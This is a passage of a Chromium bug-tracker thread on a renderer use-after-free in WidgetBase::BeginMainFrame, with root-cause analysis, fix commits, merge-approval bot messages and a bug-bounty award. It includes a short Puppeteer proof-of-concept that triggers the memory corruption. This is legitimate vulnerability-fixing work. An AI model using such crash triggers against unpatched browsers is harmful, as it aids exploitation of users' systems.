Thinking about it a bit more, it is still possible it is the same UAF - I am still not 100% sure that the reordering introduced by the waitForDebugger nested loop is necessary for the UAF to happen (it looks like we are unloading the main frame while opening the pop up, such an interference might be still benign). I will continue with the investigation on Monday.

### ja...@chromium.org (2022-11-16)

The root cause of the bug here is that WidgetBase::BeginMainFrame calls DispatchRafAlignedInput (https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/widget/widget_base.cc;l=901;drc=823737b81da049d9c2eaa2281be8c09a1af776b7). DispatchRafAlignedInput in turn calls the mousemove handler in JS; the mouse move handler will then detach the frame (thus destroying the WidgetBase instance that still has a method on the stack!) via the navigation (which schedules frame unload) and window.open (which processes the message loop when waiting for , thus detaching the frame). When the execution returns back to BeginMainFrame, the widget is already gone, so touching its fields is UAF.

For this particular bug, it is essential that the handler runs is RAF-throttled (so setTimeout would not work) and that we manage to process the navigation events from JavaScript (in particular, detach the frame within one JavaScript call, without going back to the main message loop).

As a result, the bug described in https://crbug.com/chromium/1381871#c21 really looks like a different bug. The scenario triggered by this repro critically relies on browser CDP connection (i.e., puppeteer) and on running from a RAF-throttled event handler (such as mousemove or similar).

### ja...@chromium.org (2022-11-16)

The easiest (but hacky) fix would be to make WidgetBase::BeginMainFrame resilient to 'this' being freed.
Prototype: https://chromium-review.googlesource.com/c/chromium/src/+/4030809

Ideally, we would also tweak waitForDebugger to not process the message loop while waiting, but that will require a significant amount of work, so it is not really appropriate as a quick fix here.

### ja...@chromium.org (2022-11-17)

Unfortunately, I failed to construct a test that works without puppeteer. Here is a simplified puppeteer repro that does not need any extra html file, web server or user interaction:


```
const launchCommand = '/home/jarin/chromium/src/out/asan/chrome';

(async () => {
    const puppeteer = require('puppeteer')
    const executablePath = launchCommand
    const launchOptions = {
      headless: false,
      // slowMo: 250
      executablePath,
      timeout: 10000,
       dumpio:true, // output asan log
      args: ['--disable-gpu']
    }
    let browser = await puppeteer.launch(launchOptions)
    var [page] = await browser.pages();

    await page.evaluate(`
    function trigerRandFunctionCall() {
        location = "chrome-extension://xxxx";
        window.open('about:blank', '', 'width=500, height=500');
    }
    document.addEventListener("mousemove", trigerRandFunctionCall, true);
    `);
    await page.mouse.move(10, 10);
  })();
```

I tried to convert this into an inspector protocol tests, but compositing seems to be wired differently there, so there is no UAF. I have also spent time looking into tweaking EventHandlingWebFrameWidgetSimTest.RafAlignedEventWithUpdate to free the web frame widget from input handler, but the testing machinery (mocks/fakes, etc.) cannot quite survive closing the web frame widget even when WidgetBase is fixed. 

Assigning to dtapuska@ to decide how we proceed from here because the proposed fix is ultimately inside the compositor machinery. One option is to land the fix without a test, but it would be nice to have some protection against similar problems.

### gi...@appspot.gserviceaccount.com (2022-11-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/af6e22c14bec7ad64115b24ece6d423f144214ca

commit af6e22c14bec7ad64115b24ece6d423f144214ca
Author: Jaroslav Sevcik <jarin@chromium.org>
Date: Thu Nov 17 16:54:41 2022

Make WidgetBase::BeginMainFrame resilient to disposed 'this'

This patch makes sure that WidgetBase::BeginMainFrame can finish
execution even if processing the RAF-throttled handlers
(DispatchRafAlignedInput) destroys 'this' instance.

Bug: chromium:1381871
Change-Id: I81aa4ba697f80f8666bb2a3b5542cac210b1efa9
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4030809
Reviewed-by: Dave Tapuska <dtapuska@chromium.org>
Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1072864}

[modify] https://crrev.com/af6e22c14bec7ad64115b24ece6d423f144214ca/third_party/blink/renderer/platform/widget/widget_base.cc


### [Deleted User] (2022-11-24)

dtapuska: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dt...@chromium.org (2022-11-24)

[Empty comment from Monorail migration]

### dt...@chromium.org (2022-11-24)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-24)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-24)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-24)

Requesting merge to extended stable M106 because latest trunk commit (1072864) appears to be after extended stable branch point (1036826).

Requesting merge to stable M107 because latest trunk commit (1072864) appears to be after stable branch point (1047731).

Requesting merge to beta M108 because latest trunk commit (1072864) appears to be after beta branch point (1058933).

Requesting merge to dev M109 because latest trunk commit (1072864) appears to be after dev branch point (1070088).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-24)

Merge approved: your change passed merge requirements and is auto-approved for M109. Please go ahead and merge the CL to branch 5414 (refs/branch-heads/5414) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: govind (Android), eakpobaro (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-24)

Merge review required: M108 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-24)

Merge review required: M107 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-24)

Merge review required: M106 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-28)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pb...@google.com (2022-11-28)

[Bulk Edit] This merge has been approved for M109, please help complete your merges asap (before 4pm PST) today, so the change can be included in this week's RC build for dev/beta releases

### gi...@appspot.gserviceaccount.com (2022-11-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/435e0bee91bbb9e9ea66878ada1eb3acc9193aa4

commit 435e0bee91bbb9e9ea66878ada1eb3acc9193aa4
Author: Jaroslav Sevcik <jarin@chromium.org>
Date: Tue Nov 29 05:29:05 2022

Make WidgetBase::BeginMainFrame resilient to disposed 'this'

This patch makes sure that WidgetBase::BeginMainFrame can finish
execution even if processing the RAF-throttled handlers
(DispatchRafAlignedInput) destroys 'this' instance.

(cherry picked from commit af6e22c14bec7ad64115b24ece6d423f144214ca)

Bug: chromium:1381871
Change-Id: I81aa4ba697f80f8666bb2a3b5542cac210b1efa9
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4030809
Reviewed-by: Dave Tapuska <dtapuska@chromium.org>
Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1072864}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4055626
Auto-Submit: Jaroslav Sevcik <jarin@chromium.org>
Cr-Commit-Position: refs/branch-heads/5414@{#279}
Cr-Branched-From: 4417ee59d7bf6df7a9c9ea28f7722d2ee6203413-refs/heads/main@{#1070088}

[modify] https://crrev.com/435e0bee91bbb9e9ea66878ada1eb3acc9193aa4/third_party/blink/renderer/platform/widget/widget_base.cc


### am...@chromium.org (2022-11-30)

M108 merge approved, please merge this fix to branch 5359 at your earliest convenience. 

M108 is not Stable channel; merges to M106 and M107 are not longer needed; removed labels accordingly. 

### gi...@appspot.gserviceaccount.com (2022-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/77208afba04dd703a018252efc2698b84fb41698

commit 77208afba04dd703a018252efc2698b84fb41698
Author: Jaroslav Sevcik <jarin@chromium.org>
Date: Thu Dec 01 14:15:52 2022

Make WidgetBase::BeginMainFrame resilient to disposed 'this'

This patch makes sure that WidgetBase::BeginMainFrame can finish
execution even if processing the RAF-throttled handlers
(DispatchRafAlignedInput) destroys 'this' instance.

(cherry picked from commit af6e22c14bec7ad64115b24ece6d423f144214ca)

Bug: chromium:1381871
Change-Id: I81aa4ba697f80f8666bb2a3b5542cac210b1efa9
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4030809
Reviewed-by: Dave Tapuska <dtapuska@chromium.org>
Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1072864}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4068023
Auto-Submit: Jaroslav Sevcik <jarin@chromium.org>
Commit-Queue: Dave Tapuska <dtapuska@chromium.org>
Cr-Commit-Position: refs/branch-heads/5359@{#1053}
Cr-Branched-From: 27d3765d341b09369006d030f83f582a29eb57ae-refs/heads/main@{#1058933}

[modify] https://crrev.com/77208afba04dd703a018252efc2698b84fb41698/third_party/blink/renderer/platform/widget/widget_base.cc


### am...@google.com (2022-12-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-12-02)

Congratulations! The VRP Panel had decided to award you $1,500 for this moderately mitigated security bug. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-12-05)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-12-12)

[Empty comment from Monorail migration]

### pg...@google.com (2022-12-14)

[Empty comment from Monorail migration]

### pg...@google.com (2022-12-14)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1381871?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Internals>Frames, Platform>DevTools, UI>Browser>Navigation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061620)*
